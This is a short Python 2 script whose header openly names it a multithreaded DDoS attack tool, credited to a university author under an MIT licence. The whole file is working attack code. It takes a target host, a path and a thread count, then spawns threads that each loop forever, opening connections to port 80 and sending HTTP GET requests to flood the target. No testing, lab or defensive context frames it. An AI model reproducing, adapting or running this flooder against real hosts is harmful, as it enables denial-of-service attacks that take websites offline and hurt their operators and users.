'''
Multithreading DDOS Attack Script
Author: Jinhua Wang
University of Toronto
License: MIT 
'''
import socket, sys, os  
from threading import Thread
print "][ Attacking " + sys.argv[1]  + " ... ]["  
print "injecting " + sys.argv[2];  
print "concurrent threads " + sys.argv[3]

def attack():  
	while True:   
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
		try:  
			s.connect((sys.argv[1], 80))  
			print ">> GET /" + sys.argv[2] + " HTTP/1.1"  
			s.send("GET /" + sys.argv[2] + " HTTP/1.1\r\n")  
			s.send("Host: " + sys.argv[1]  + "\r\n\r\n");  
			s.close()
		except socket.error, exc:
			print "Socket error: socket.error %s" %exc  

for i in range(1, int(sys.argv[3])):  
	t = Thread(target=attack, args=[])
	t.start()  